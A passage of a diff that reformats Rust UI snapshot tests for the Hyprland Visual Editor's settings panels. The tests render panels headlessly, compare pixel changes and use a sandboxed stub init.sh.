     save_slice_png(es_snap.clone(), "panel_save_es.png");
     let es_diff = count_buffer_diff(&empty_list_snap, &es_snap);
-    assert!(es_diff > 200, "Spanish Save copy must change pixels — got {es_diff} expected >200");
+    assert!(
+        es_diff > 200,
+        "Spanish Save copy must change pixels — got {es_diff} expected >200"
+    );
 }
 
 // ── Mutating-window slice 3: Borders pick layer (R3) ───────────────
@@ -4505,16 +4802,14 @@ fn panel_save_renders() {
 #[test]
 fn panel_borders_pick_renders() {
     use slint::{ComponentHandle as _, ModelRc, SharedString, VecModel};
-    i_slint_core::platform::set_platform(Box::new(
-        i_slint_backend_testing::TestingBackend::new(
-            i_slint_backend_testing::TestingBackendOptions {
-                mock_time: true,
-                threading: false,
-                renderer_name: Some(slint::SharedString::from("software")),
-                ..Default::default()
-            },
-        ),
-    ))
+    i_slint_core::platform::set_platform(Box::new(i_slint_backend_testing::TestingBackend::new(
+        i_slint_backend_testing::TestingBackendOptions {
+            mock_time: true,
+            threading: false,
+            renderer_name: Some(slint::SharedString::from("software")),
+            ..Default::default()
+        },
+    )))
     .expect("platform already initialized");
 
     let win = crate::MainWindow::new().unwrap();
@@ -4582,23 +4877,27 @@ fn panel_borders_pick_renders() {
         });
     }
     win.set_gallery_cards(ModelRc::new(VecModel::from(cards)));
-    let tiles: Vec<crate::SliceTileData> = crate::shell::gallery::views::slice::slice_delta_tiles(count, 0, stage_w)
-        .into_iter()
-        .map(|t| crate::SliceTileData {
-            delta: t.delta,
-            real_index: t.real_index as i32,
-            is_expanded: t.is_expanded,
-            fade: t.fade,
-            dist: t.dist,
-        })
-        .collect();
+    let tiles: Vec<crate::SliceTileData> =
+        crate::shell::gallery::views::slice::slice_delta_tiles(count, 0, stage_w)
+            .into_iter()
+            .map(|t| crate::SliceTileData {
+                delta: t.delta,
+                real_index: t.real_index as i32,
+                is_expanded: t.is_expanded,
+                fade: t.fade,
+                dist: t.dist,
+            })
+            .collect();
     win.set_gallery_slice_tiles(ModelRc::new(VecModel::from(tiles)));
     win.set_gallery_slice_focus_pos(0.0);
 
     for _ in 0..2 {
         i_slint_backend_testing::mock_elapsed_time(std::time::Duration::from_millis(16));
     }
-    let snap = win.window().take_snapshot().expect("panel borders pick snapshot");
+    let snap = win
+        .window()
+        .take_snapshot()
+        .expect("panel borders pick snapshot");
     save_slice_png(snap.clone(), "panel_borders_pick.png");
     assert!(snap.width() == 1920, "snapshot width 1920");
 
@@ -4607,12 +4906,25 @@ fn panel_borders_pick_renders() {
     for _ in 0..2 {
         i_slint_backend_testing::mock_elapsed_time(std::time::Duration::from_millis(16));
     }
-    let snap2 = win.window().take_snapshot().expect("panel borders pick active2");
+    let snap2 = win
+        .window()
+        .take_snapshot()
+        .expect("panel borders pick active2");
     save_slice_png(snap2.clone(), "panel_borders_pick_active2.png");
     // Full frame: the panel is full-bleed, so its preset list sits lower than
     // the mosaic band `count_buffer_diff` was written for.
-    let diff = count_buffer_diff_region(&snap, &snap2, 0, 0, snap.width() as usize, snap.height() as usize);
-    assert!(diff > 200, "active indicator must change pixels — got {diff} expected >200");
+    let diff = count_buffer_diff_region(
+        &snap,
+        &snap2,
+        0,
+        0,
+        snap.width() as usize,
+        snap.height() as usize,
+    );
+    assert!(
+        diff > 200,
+        "active indicator must change pixels — got {diff} expected >200"
+    );
 }
 
 // ── Mutating-window slice 4: Borders tune layer (R3, COLOR GATED) ─────────
@@ -4620,16 +4932,14 @@ fn panel_borders_pick_renders() {
 #[test]
 fn panel_borders_tune_renders() {
     use slint::{ComponentHandle as _, ModelRc, SharedString, VecModel};
-    i_slint_core::platform::set_platform(Box::new(
-        i_slint_backend_testing::TestingBackend::new(
-            i_slint_backend_testing::TestingBackendOptions {
-                mock_time: true,
-                threading: false,
-                renderer_name: Some(slint::SharedString::from("software")),
-                ..Default::default()
-            },
-        ),
-    ))
+    i_slint_core::platform::set_platform(Box::new(i_slint_backend_testing::TestingBackend::new(
+        i_slint_backend_testing::TestingBackendOptions {
+            mock_time: true,
+            threading: false,
+            renderer_name: Some(slint::SharedString::from("software")),
+            ..Default::default()
+        },
+    )))
     .expect("platform already initialized");
 
     let win = crate::MainWindow::new().unwrap();
@@ -4702,23 +5012,27 @@ fn panel_borders_tune_renders() {
         });
     }
     win.set_gallery_cards(ModelRc::new(VecModel::from(cards)));
-    let tiles: Vec<crate::SliceTileData> = crate::shell::gallery::views::slice::slice_delta_tiles(count, 0, stage_w)
-        .into_iter()
-        .map(|t| crate::SliceTileData {
-            delta: t.delta,
-            real_index: t.real_index as i32,
-            is_expanded: t.is_expanded,
-            fade: t.fade,
-            dist: t.dist,
-        })
-        .collect();
+    let tiles: Vec<crate::SliceTileData> =
+        crate::shell::gallery::views::slice::slice_delta_tiles(count, 0, stage_w)
+            .into_iter()
+            .map(|t| crate::SliceTileData {
+                delta: t.delta,
+                real_index: t.real_index as i32,
+                is_expanded: t.is_expanded,
+                fade: t.fade,
+                dist: t.dist,
+            })
+            .collect();
     win.set_gallery_slice_tiles(ModelRc::new(VecModel::from(tiles)));
     win.set_gallery_slice_focus_pos(0.0);
 
     for _ in 0..2 {
         i_slint_backend_testing::mock_elapsed_time(std::time::Duration::from_millis(16));
     }
-    let snap = win.window().take_snapshot().expect("panel borders tune snapshot");
+    let snap = win
+        .window()
+        .take_snapshot()
+        .expect("panel borders tune snapshot");
     save_slice_png(snap.clone(), "panel_borders_tune.png");
     assert!(snap.width() == 1920, "snapshot width 1920");
 
@@ -4731,10 +5045,16 @@ fn panel_borders_tune_renders() {
     for _ in 0..2 {
         i_slint_backend_testing::mock_elapsed_time(std::time::Duration::from_millis(16));
     }
-    let snap2 = win.window().take_snapshot().expect("panel borders tune snapped");
+    let snap2 = win
+        .window()
+        .take_snapshot()
+        .expect("panel borders tune snapped");
     save_slice_png(snap2.clone(), "panel_borders_tune_snapped.png");
     let diff = count_buffer_diff(&snap, &snap2);
-    assert!(diff > 200, "tune snap must change pixels — got {diff} expected >200 (slider values)");
+    assert!(
+        diff > 200,
+        "tune snap must change pixels — got {diff} expected >200 (slider values)"
+    );
 
     // Color-gated placeholder must be present — check second diff still >0 for tune vs pick baseline
     // Tune baseline must differ from pick baseline (sliders visible)
@@ -4748,16 +5068,14 @@ fn panel_borders_tune_renders() {
 #[test]
 fn panel_borders_two_pane_and_stacked_render() {
     use slint::{ComponentHandle as _, ModelRc, SharedString, VecModel};
-    i_slint_core::platform::set_platform(Box::new(
-        i_slint_backend_testing::TestingBackend::new(
-            i_slint_backend_testing::TestingBackendOptions {
-                mock_time: true,
-                threading: false,
-                renderer_name: Some(slint::SharedString::from("software")),
-                ..Default::default()
-            },
-        ),
-    ))
+    i_slint_core::platform::set_platform(Box::new(i_slint_backend_testing::TestingBackend::new(
+        i_slint_backend_testing::TestingBackendOptions {
+            mock_time: true,
+            threading: false,
+            renderer_name: Some(slint::SharedString::from("software")),
+            ..Default::default()
+        },
+    )))
     .expect("platform already initialized");
 
     let win = crate::MainWindow::new().unwrap();
@@ -4808,7 +5126,10 @@ fn panel_borders_two_pane_and_stacked_render() {
     for _ in 0..4 {
         i_slint_backend_testing::mock_elapsed_time(std::time::Duration::from_millis(16));
     }
-    let narrow = win.window().take_snapshot().expect("borders narrow snapshot");
+    let narrow = win
+        .window()
+        .take_snapshot()
+        .expect("borders narrow snapshot");
     save_slice_png(narrow.clone(), "panel_borders_stacked.png");
     assert_eq!(narrow.width(), 820, "narrow snapshot width");
 }
@@ -4818,14 +5139,17 @@ fn panel_borders_two_pane_and_stacked_render() {
 /// Saves one PNG per section for human review.
 #[test]
 fn panel_motion_system_save_stacked_render() {
-    use slint::{ComponentHandle as _, ModelRc, SharedString, VecModel};
     use slint::platform::Key;
+    use slint::{ComponentHandle as _, ModelRc, SharedString, VecModel};
     let win = focus_open_system_panel();
     win.window().set_size(slint::PhysicalSize::new(820, 1080));
     for _ in 0..20 {
         i_slint_backend_testing::mock_elapsed_time(std::time::Duration::from_millis(16));
     }
-    let sys = win.window().take_snapshot().expect("system stacked snapshot");
+    let sys = win
+        .window()
+        .take_snapshot()
+        .expect("system stacked snapshot");
     save_slice_png(sys.clone(), "panel_system_stacked.png");
     assert_eq!(sys.width(), 820, "system stacked width");
 
@@ -4849,16 +5173,27 @@ fn panel_motion_system_save_stacked_render() {
     save_slice_png(save_snap.clone(), "panel_save_stacked.png");
 
     // Motion: cards | bezier must stack.
-    win.set_anim_titles(ModelRc::new(VecModel::from(vec![SharedString::from("Anim 01")])));
-    win.set_anim_descs(ModelRc::new(VecModel::from(vec![SharedString::from("desc")])));
-    win.set_anim_tags(ModelRc::new(VecModel::from(vec![SharedString::from("SYSTEM")])));
-    win.set_anim_files(ModelRc::new(VecModel::from(vec![SharedString::from("a.lua")])));
+    win.set_anim_titles(ModelRc::new(VecModel::from(vec![SharedString::from(
+        "Anim 01",
+    )])));
+    win.set_anim_descs(ModelRc::new(VecModel::from(vec![SharedString::from(
+        "desc",
+    )])));
+    win.set_anim_tags(ModelRc::new(VecModel::from(vec![SharedString::from(
+        "SYSTEM",
+    )])));
+    win.set_anim_files(ModelRc::new(VecModel::from(vec![SharedString::from(
+        "a.lua",
+    )])));
     win.set_panel_section(2);
     focus_press_key(&win, Key::RightArrow); // jump to the tune pane (bezier)
     for _ in 0..20 {
         i_slint_backend_testing::mock_elapsed_time(std::time::Duration::from_millis(16));
     }
-    let motion = win.window().take_snapshot().expect("motion stacked snapshot");
+    let motion = win
+        .window()
+        .take_snapshot()
+        .expect("motion stacked snapshot");
     save_slice_png(motion.clone(), "panel_motion_stacked.png");
 }
 
@@ -4873,7 +5208,10 @@ fn panel_system_narrow_pane_keeps_retardo_toggle() {
     for _ in 0..20 {
         i_slint_backend_testing::mock_elapsed_time(std::time::Duration::from_millis(16));
     }
-    let snap = win.window().take_snapshot().expect("system narrow pane snapshot");
+    let snap = win
+        .window()
+        .take_snapshot()
+        .expect("system narrow pane snapshot");
     save_slice_png(snap.clone(), "panel_system_1200.png");
     assert_eq!(snap.width(), 1200, "narrow two-col width");
 }
@@ -4975,16 +5313,14 @@ fn assert_slot_corners_are_panel_ink(snap: &slint::SharedPixelBuffer<slint::Rgba
 #[test]
 fn panel_curve_preview_renders() {
     use slint::{ComponentHandle as _, ModelRc, SharedString, VecModel};
-    i_slint_core::platform::set_platform(Box::new(
-        i_slint_backend_testing::TestingBackend::new(
-            i_slint_backend_testing::TestingBackendOptions {
-                mock_time: true,
-                threading: false,
-                renderer_name: Some(slint::SharedString::from("software")),
-                ..Default::default()
-            },
-        ),
-    ))
+    i_slint_core::platform::set_platform(Box::new(i_slint_backend_testing::TestingBackend::new(
+        i_slint_backend_testing::TestingBackendOptions {
+            mock_time: true,
+            threading: false,
+            renderer_name: Some(slint::SharedString::from("software")),
+            ..Default::default()
+        },
+    )))
     .expect("platform already initialized");
 
     let win = crate::MainWindow::new().unwrap();
@@ -5002,10 +5338,16 @@ fn panel_curve_preview_renders() {
     // Animation presets (R4) — scan("animations") → cards
     // Use 3 entries for preview visibility (19-card unit test covers full 19 in callbacks);
     // preview sits below cards, so with 19 it would be scrolled off-screen and diff would be 0.
-    let titles: Vec<SharedString> = (1..=3).map(|i| SharedString::from(format!("Anim {i:02}"))).collect();
-    let descs: Vec<SharedString> = (1..=3).map(|i| SharedString::from(format!("Animation {i:02} desc"))).collect();
+    let titles: Vec<SharedString> = (1..=3)
+        .map(|i| SharedString::from(format!("Anim {i:02}")))
+        .collect();
+    let descs: Vec<SharedString> = (1..=3)
+        .map(|i| SharedString::from(format!("Animation {i:02} desc")))
+        .collect();
     let tags: Vec<SharedString> = (1..=3).map(|_| SharedString::from("SYSTEM")).collect();
-    let files: Vec<SharedString> = (1..=3).map(|i| SharedString::from(format!("anim{:02}.conf", i))).collect();
+    let files: Vec<SharedString> = (1..=3)
+        .map(|i| SharedString::from(format!("anim{:02}.conf", i)))
+        .collect();
     win.set_anim_titles(ModelRc::new(VecModel::from(titles)));
     win.set_anim_descs(ModelRc::new(VecModel::from(descs)));
     win.set_anim_tags(ModelRc::new(VecModel::from(tags)));
@@ -5043,23 +5385,27 @@ fn panel_curve_preview_renders() {
         });
     }
     win.set_gallery_cards(ModelRc::new(VecModel::from(cards)));
-    let tiles: Vec<crate::SliceTileData> = crate::shell::gallery::views::slice::slice_delta_tiles(count, 0, stage_w)
-        .into_iter()
-        .map(|t| crate::SliceTileData {
-            delta: t.delta,
-            real_index: t.real_index as i32,
-            is_expanded: t.is_expanded,
-            fade: t.fade,
-            dist: t.dist,
-        })
-        .collect();
+    let tiles: Vec<crate::SliceTileData> =
+        crate::shell::gallery::views::slice::slice_delta_tiles(count, 0, stage_w)
+            .into_iter()
+            .map(|t| crate::SliceTileData {
+                delta: t.delta,
+                real_index: t.real_index as i32,
+                is_expanded: t.is_expanded,
+                fade: t.fade,
+                dist: t.dist,
+            })
+            .collect();
     win.set_gallery_slice_tiles(ModelRc::new(VecModel::from(tiles)));
     win.set_gallery_slice_focus_pos(0.0);
 
     for _ in 0..2 {
         i_slint_backend_testing::mock_elapsed_time(std::time::Duration::from_millis(16));
     }
-    let snap = win.window().take_snapshot().expect("panel curve preview snapshot");
+    let snap = win
+        .window()
+        .take_snapshot()
+        .expect("panel curve preview snapshot");
     save_slice_png(snap.clone(), "panel_curve_preview.png");
     assert!(snap.width() == 1920, "snapshot width 1920");
 
@@ -5068,20 +5414,32 @@ fn panel_curve_preview_renders() {
     for _ in 0..2 {
         i_slint_backend_testing::mock_elapsed_time(std::time::Duration::from_millis(16));
     }
-    let snap2 = win.window().take_snapshot().expect("panel curve preview b08 snapshot");
+    let snap2 = win
+        .window()
+        .take_snapshot()
+        .expect("panel curve preview b08 snapshot");
     save_slice_png(snap2.clone(), "panel_curve_preview_b08.png");
     let diff = count_buffer_diff(&snap, &snap2);
-    assert!(diff > 200, "curve preview must redraw on b change — got {diff} expected >200 (bezier 0.1→0.8)");
+    assert!(
+        diff > 200,
+        "curve preview must redraw on b change — got {diff} expected >200 (bezier 0.1→0.8)"
+    );
 
     // Active indicator check: picking different animation still shows 19 cards, no crash
     win.set_active_anim_index(1);
     for _ in 0..2 {
         i_slint_backend_testing::mock_elapsed_time(std::time::Duration::from_millis(16));
     }
-    let snap3 = win.window().take_snapshot().expect("panel curve preview active2");
+    let snap3 = win
+        .window()
+        .take_snapshot()
+        .expect("panel curve preview active2");
     save_slice_png(snap3.clone(), "panel_curve_preview_active2.png");
     let diff2 = count_buffer_diff(&snap, &snap3);
-    assert!(diff2 > 200, "active indicator must change pixels — got {diff2} expected >200");
+    assert!(
+        diff2 > 200,
+        "active indicator must change pixels — got {diff2} expected >200"
+    );
 }
 
 // ── Mutating-window slice 6: Filters pick (R5) ──
@@ -5089,16 +5447,14 @@ fn panel_curve_preview_renders() {
 #[test]
 fn panel_filters_renders() {
     use slint::{ComponentHandle as _, ModelRc, SharedString, VecModel};
-    i_slint_core::platform::set_platform(Box::new(
-        i_slint_backend_testing::TestingBackend::new(
-            i_slint_backend_testing::TestingBackendOptions {
-                mock_time: true,
-                threading: false,
-                renderer_name: Some(slint::SharedString::from("software")),
-                ..Default::default()
-            },
-        ),
-    ))
+    i_slint_core::platform::set_platform(Box::new(i_slint_backend_testing::TestingBackend::new(
+        i_slint_backend_testing::TestingBackendOptions {
+            mock_time: true,
+            threading: false,
+            renderer_name: Some(slint::SharedString::from("software")),
+            ..Default::default()
+        },
+    )))
     .expect("platform already initialized");
 
     let win = crate::MainWindow::new().unwrap();
@@ -5114,10 +5470,19 @@ fn panel_filters_renders() {
     win.set_is_panel_open(true);
 
     // Shader presets (R5) — scan("shaders") → cards
-    let titles: Vec<SharedString> = vec![SharedString::from("Blue Light"), SharedString::from("Cyberpunk")];
-    let descs: Vec<SharedString> = vec![SharedString::from("Blue light filter"), SharedString::from("Cyberpunk neon")];
+    let titles: Vec<SharedString> = vec![
+        SharedString::from("Blue Light"),
+        SharedString::from("Cyberpunk"),
+    ];
+    let descs: Vec<SharedString> = vec![
+        SharedString::from("Blue light filter"),
+        SharedString::from("Cyberpunk neon"),
+    ];
     let tags: Vec<SharedString> = vec![SharedString::from("SYSTEM"), SharedString::from("SYSTEM")];
-    let files: Vec<SharedString> = vec![SharedString::from("blue-light.ron"), SharedString::from("cyberpunk.ron")];
+    let files: Vec<SharedString> = vec![
+        SharedString::from("blue-light.ron"),
+        SharedString::from("cyberpunk.ron"),
+    ];
     win.set_shader_titles(ModelRc::new(VecModel::from(titles)));
     win.set_shader_descs(ModelRc::new(VecModel::from(descs)));
     win.set_shader_tags(ModelRc::new(VecModel::from(tags)));
@@ -5150,23 +5515,27 @@ fn panel_filters_renders() {
         });
     }
     win.set_gallery_cards(ModelRc::new(VecModel::from(cards)));
-    let tiles: Vec<crate::SliceTileData> = crate::shell::gallery::views::slice::slice_delta_tiles(count, 0, stage_w)
-        .into_iter()
-        .map(|t| crate::SliceTileData {
-            delta: t.delta,
-            real_index: t.real_index as i32,
-            is_expanded: t.is_expanded,
-            fade: t.fade,
-            dist: t.dist,
-        })
-        .collect();
+    let tiles: Vec<crate::SliceTileData> =
+        crate::shell::gallery::views::slice::slice_delta_tiles(count, 0, stage_w)
+            .into_iter()
+            .map(|t| crate::SliceTileData {
+                delta: t.delta,
+                real_index: t.real_index as i32,
+                is_expanded: t.is_expanded,
+                fade: t.fade,
+                dist: t.dist,
+            })
+            .collect();
     win.set_gallery_slice_tiles(ModelRc::new(VecModel::from(tiles)));
     win.set_gallery_slice_focus_pos(0.0);
 
     for _ in 0..2 {
         i_slint_backend_testing::mock_elapsed_time(std::time::Duration::from_millis(16));
     }
-    let snap = win.window().take_snapshot().expect("panel filters snapshot");
+    let snap = win
+        .window()
+        .take_snapshot()
+        .expect("panel filters snapshot");
     save_slice_png(snap.clone(), "panel_filters.png");
     assert!(snap.width() == 1920, "snapshot width 1920");
 
@@ -5178,7 +5547,10 @@ fn panel_filters_renders() {
     let snap2 = win.window().take_snapshot().expect("panel filters active2");
     save_slice_png(snap2.clone(), "panel_filters_active2.png");
     let diff = count_buffer_diff(&snap, &snap2);
-    assert!(diff > 200, "active shader indicator must change pixels — got {diff} expected >200");
+    assert!(
+        diff > 200,
+        "active shader indicator must change pixels — got {diff} expected >200"
+    );
 
     // Spanish pass: the section title, the description under it and the
     // keyboard hint live in `FiltersText`, so moving only that global must
@@ -5190,7 +5562,10 @@ fn panel_filters_renders() {
     let es_snap = win.window().take_snapshot().expect("panel filters spanish");
     save_slice_png(es_snap.clone(), "panel_filters_es.png");
     let es_diff = count_buffer_diff(&snap2, &es_snap);
-    assert!(es_diff > 200, "Spanish Filters copy must change pixels — got {es_diff} expected >200");
+    assert!(
+        es_diff > 200,
+        "Spanish Filters copy must change pixels — got {es_diff} expected >200"
+    );
 }
 
 // ── Mutating-window slice 7: System (R7, R11) ───────────────────────
@@ -5209,8 +5584,12 @@ fn test_system_minimize_10s() {
     // call, so the SAME semantics are asserted with zero outside effects.
     let _env = crate::test_utils::TempEnv::new();
     let path = "ui/panel/sections/SystemSection.slint";
-    let content = std::fs::read_to_string(path).expect("SystemSection.slint must exist for slice 7");
-    assert!(content.contains("10"), "timer 10s row must be present — got content without \"10\"");
+    let content =
+        std::fs::read_to_string(path).expect("SystemSection.slint must exist for slice 7");
+    assert!(
+        content.contains("10"),
+        "timer 10s row must be present — got content without \"10\""
+    );
     assert!(
         content.contains("System") || content.contains("system"),
         "System ON/OFF status block must be present"
@@ -5218,7 +5597,10 @@ fn test_system_minimize_10s() {
     // Also verify Config can hold 10s (engine sealed — no engine edit)
     let mut cfg = crate::config::Config::default();
     cfg.minimize_seconds = 10;
-    assert_eq!(cfg.minimize_seconds, 10, "minimize_seconds 10s via toggle_system path");
+    assert_eq!(
+        cfg.minimize_seconds, 10,
+        "minimize_seconds 10s via toggle_system path"
+    );
 
     // Temp project whose `init.sh` records its argument instead of running the
     // real enable path (which would touch the real cache/config/hyprland.lua
@@ -5230,7 +5612,10 @@ fn test_system_minimize_10s() {
     let init = scripts.join("init.sh");
     std::fs::write(
         &init,
-        format!("#!/bin/bash\necho \"$1\" >> \"{}\"\nexit 0\n", record.display()),
+        format!(
+            "#!/bin/bash\necho \"$1\" >> \"{}\"\nexit 0\n",
+            record.display()
+        ),
     )
     .unwrap();
     #[cfg(unix)]
@@ -5249,7 +5634,10 @@ fn test_system_minimize_10s() {
     let tm = crate::theme_manager::ThemeManager::new(proj.path());
     let mut state = crate::app_state::AppState::new(cfg2, engine, tm);
     let _ = state.toggle_system(true);
-    assert!(state.cfg().is_system_active, "toggle_system(true) must set active");
+    assert!(
+        state.cfg().is_system_active,
+        "toggle_system(true) must set active"
+    );
     assert!(
         crate::config::Config::load().is_system_active,
         "toggle_system(true) must persist the flag to the sandboxed config"
@@ -5295,16 +5683,14 @@ fn test_system_rows_render() {
 #[test]
 fn panel_system_renders() {
     use slint::{ComponentHandle as _, ModelRc, SharedString, VecModel};
-    i_slint_core::platform::set_platform(Box::new(
-        i_slint_backend_testing::TestingBackend::new(
-            i_slint_backend_testing::TestingBackendOptions {
-                mock_time: true,
-                threading: false,
-                renderer_name: Some(slint::SharedString::from("software")),
-                ..Default::default()
-            },
-        ),
-    ))
+    i_slint_core::platform::set_platform(Box::new(i_slint_backend_testing::TestingBackend::new(
+        i_slint_backend_testing::TestingBackendOptions {
+            mock_time: true,
+            threading: false,
+            renderer_name: Some(slint::SharedString::from("software")),
+            ..Default::default()
+        },
+    )))
     .expect("platform already initialized");
 
     let win = crate::MainWindow::new().unwrap();
@@ -5342,10 +5728,18 @@ fn panel_system_renders() {
     // About props
     win.set_home_about_title("About HVE".into());
     win.set_home_about_short("Hyprland Visual Editor makes your desktop truly yours.".into());
-    win.set_home_about_full("HVE is a graphical app to visually manage your Hyprland desktop aesthetics.".into());
+    win.set_home_about_full(
+        "HVE is a graphical app to visually manage your Hyprland desktop aesthetics.".into(),
+    );
     win.set_home_about_tree_label("Project structure".into());
-    win.set_home_about_tree_paths(ModelRc::new(VecModel::from(vec![SharedString::from("a/b"), SharedString::from("c/d")])));
-    win.set_home_about_tree_descs(ModelRc::new(VecModel::from(vec![SharedString::from("desc a"), SharedString::from("desc c")])));
+    win.set_home_about_tree_paths(ModelRc::new(VecModel::from(vec![
+        SharedString::from("a/b"),
+        SharedString::from("c/d"),
+    ])));
+    win.set_home_about_tree_descs(ModelRc::new(VecModel::from(vec![
+        SharedString::from("desc a"),
+        SharedString::from("desc c"),
+    ])));
     win.set_home_about_tree_path_max("a/b".into());
     win.set_home_about_docs_label("View documentation".into());
 
@@ -5375,23 +5769,27 @@ fn panel_system_renders() {
         });
     }
     win.set_gallery_cards(ModelRc::new(VecModel::from(cards)));
-    let tiles: Vec<crate::SliceTileData> = crate::shell::gallery::views::slice::slice_delta_tiles(count, 0, stage_w)
-        .into_iter()
-        .map(|t| crate::SliceTileData {
-            delta: t.delta,
-            real_index: t.real_index as i32,
-            is_expanded: t.is_expanded,
-            fade: t.fade,
-            dist: t.dist,
-        })
-        .collect();
+    let tiles: Vec<crate::SliceTileData> =
+        crate::shell::gallery::views::slice::slice_delta_tiles(count, 0, stage_w)
+            .into_iter()
+            .map(|t| crate::SliceTileData {
+                delta: t.delta,
+                real_index: t.real_index as i32,
+                is_expanded: t.is_expanded,
+                fade: t.fade,
+                dist: t.dist,
+            })
+            .collect();
     win.set_gallery_slice_tiles(ModelRc::new(VecModel::from(tiles)));
     win.set_gallery_slice_focus_pos(0.0);
 
     for _ in 0..2 {
         i_slint_backend_testing::mock_elapsed_time(std::time::Duration::from_millis(16));
     }
-    let snap_on = win.window().take_snapshot().expect("panel system ON snapshot");
+    let snap_on = win
+        .window()
+        .take_snapshot()
+        .expect("panel system ON snapshot");
     save_slice_png(snap_on.clone(), "panel_system.png");
     assert!(snap_on.width() == 1920, "snapshot width 1920");
 
@@ -5400,7 +5798,10 @@ fn panel_system_renders() {
     for _ in 0..2 {
         i_slint_backend_testing::mock_elapsed_time(std::time::Duration::from_millis(16));
     }
-    let snap_off = win.window().take_snapshot().expect("panel system OFF snapshot");
+    let snap_off = win
+        .window()
+        .take_snapshot()
+        .expect("panel system OFF snapshot");
     save_slice_png(snap_off.clone(), "panel_system_off.png");
     let diff_on_off = count_buffer_diff(&snap_on, &snap_off);
     assert!(
@@ -5414,7 +5815,10 @@ fn panel_system_renders() {
     for _ in 0..2 {
         i_slint_backend_testing::mock_elapsed_time(std::time::Duration::from_millis(16));
     }
-    let snap_10s = win.window().take_snapshot().expect("panel system 10s snapshot");
+    let snap_10s = win
+        .window()
+        .take_snapshot()
+        .expect("panel system 10s snapshot");
     save_slice_png(snap_10s.clone(), "panel_system_10s.png");
     let diff_10s = count_buffer_diff(&snap_on, &snap_10s);
     assert!(
@@ -5474,7 +5878,10 @@ fn panel_system_renders() {
     let es_snap = win.window().take_snapshot().expect("panel system spanish");
     save_slice_png(es_snap.clone(), "panel_system_es.png");
     let es_diff = count_buffer_diff(&snap_10s, &es_snap);
-    assert!(es_diff > 200, "Spanish System copy must change pixels — got {es_diff} expected >200");
+    assert!(
+        es_diff > 200,
+        "Spanish System copy must change pixels — got {es_diff} expected >200"
+    );
 
     // About area in Spanish: walk to the About row and expand the accordion
     // through the real keyboard path, so the PNG shows the paragraph, the
@@ -5485,7 +5892,10 @@ fn panel_system_renders() {
     }
     focus_press_key(&win, slint::platform::Key::Return);
     focus_settle();
-    let es_about = win.window().take_snapshot().expect("panel system about spanish");
+    let es_about = win
+        .window()
+        .take_snapshot()
+        .expect("panel system about spanish");
     save_slice_png(es_about.clone(), "panel_system_about_es.png");
     let about_diff = count_buffer_diff(&es_snap, &es_about);
     assert!(
@@ -5534,14 +5944,21 @@ fn test_no_active_tab_orphans() {
 fn test_modules_removed() {
     let content = std::fs::read_to_string("ui/modules.slint")
         .unwrap_or_else(|_| panic!("ui/modules.slint must exist (may be empty)"));
-    for needle in ["HomeModule", "AnimationsModule", "BordersModule", "ShadersModule", "ThemesModule"] {
+    for needle in [
+        "HomeModule",
+        "AnimationsModule",
+        "BordersModule",
+        "ShadersModule",
+        "ThemesModule",
+    ] {
         assert!(
             !content.contains(needle),
             "legacy module {needle} must be gone from ui/modules.slint"
         );
     }
     // SettingsPanel overlay component must be gone from ui/components.slint
-    let comp = std::fs::read_to_string("ui/components.slint").expect("ui/components.slint must exist");
+    let comp =
+        std::fs::read_to_string("ui/components.slint").expect("ui/components.slint must exist");
     assert!(
         !comp.contains("export component SettingsPanel"),
         "SettingsPanel overlay component must be removed from ui/components.slint"
@@ -5584,7 +6001,8 @@ fn test_panel_layer_gated() {
 
 #[test]
 fn test_filterbar_focus_scope_behind_pills() {
-    let content = std::fs::read_to_string("ui/gallery/FilterBar.slint").expect("ui/gallery/FilterBar.slint must exist");
+    let content = std::fs::read_to_string("ui/gallery/FilterBar.slint")
+        .expect("ui/gallery/FilterBar.slint must exist");
     let focus_pos = content
         .find("focus-scope := FocusScope")
         .expect("focus-scope := FocusScope must exist in FilterBar.slint");
@@ -5640,7 +6058,9 @@ fn theme_fade_region_modal_fraction(buf: &slint::SharedPixelBuffer<slint::Rgba8P
     for y in 0..100usize {
         for x in 0..100usize {
             let o = y * stride + x * 4;
-            *counts.entry([bytes[o], bytes[o + 1], bytes[o + 2], bytes[o + 3]]).or_default() += 1;
+            *counts
+                .entry([bytes[o], bytes[o + 1], bytes[o + 2], bytes[o + 3]])
+                .or_default() += 1;
             total += 1;
         }
     }
@@ -5651,16 +6071,14 @@ fn theme_fade_region_modal_fraction(buf: &slint::SharedPixelBuffer<slint::Rgba8P
 #[test]
 fn theme_fade_renders_settled_dissolved_and_reappeared() {
     use slint::ComponentHandle as _;
-    i_slint_core::platform::set_platform(Box::new(
-        i_slint_backend_testing::TestingBackend::new(
-            i_slint_backend_testing::TestingBackendOptions {
-                mock_time: true,
-                threading: false,
-                renderer_name: Some(slint::SharedString::from("software")),
-                ..Default::default()
-            },
-        ),
-    ))
+    i_slint_core::platform::set_platform(Box::new(i_slint_backend_testing::TestingBackend::new(
+        i_slint_backend_testing::TestingBackendOptions {
+            mock_time: true,
+            threading: false,
+            renderer_name: Some(slint::SharedString::from("software")),
+            ..Default::default()
+        },
+    )))
     .expect("platform already initialized");
 
     let win = crate::MainWindow::new().unwrap();
@@ -5713,16 +6131,14 @@ fn theme_fade_renders_settled_dissolved_and_reappeared() {
 fn save_section_renders_list_search_and_cards() {
     use slint::{ComponentHandle as _, ModelRc, SharedString, VecModel};
     // Software-rasterized headless backend (same as slice_focus_flow test).
-    i_slint_core::platform::set_platform(Box::new(
-        i_slint_backend_testing::TestingBackend::new(
-            i_slint_backend_testing::TestingBackendOptions {
-                mock_time: true,
-                threading: false,
-                renderer_name: Some(slint::SharedString::from("software")),
-                ..Default::default()
-            },
-        ),
-    ))
+    i_slint_core::platform::set_platform(Box::new(i_slint_backend_testing::TestingBackend::new(
+        i_slint_backend_testing::TestingBackendOptions {
+            mock_time: true,
+            threading: false,
+            renderer_name: Some(slint::SharedString::from("software")),
+            ..Default::default()
+        },
+    )))
     .expect("platform already initialized");
     let win = crate::MainWindow::new().unwrap();
     win.window().set_size(slint::PhysicalSize::new(1920, 1080));
@@ -5765,16 +6181,14 @@ fn save_section_renders_list_search_and_cards() {
 #[test]
 fn motion_last_slider_renders_unclipped() {
     use slint::{ComponentHandle as _, ModelRc, SharedString, VecModel};
-    i_slint_core::platform::set_platform(Box::new(
-        i_slint_backend_testing::TestingBackend::new(
-            i_slint_backend_testing::TestingBackendOptions {
-                mock_time: true,
-                threading: false,
-                renderer_name: Some(slint::SharedString::from("software")),
-                ..Default::default()
-            },
-        ),
-    ))
+    i_slint_core::platform::set_platform(Box::new(i_slint_backend_testing::TestingBackend::new(
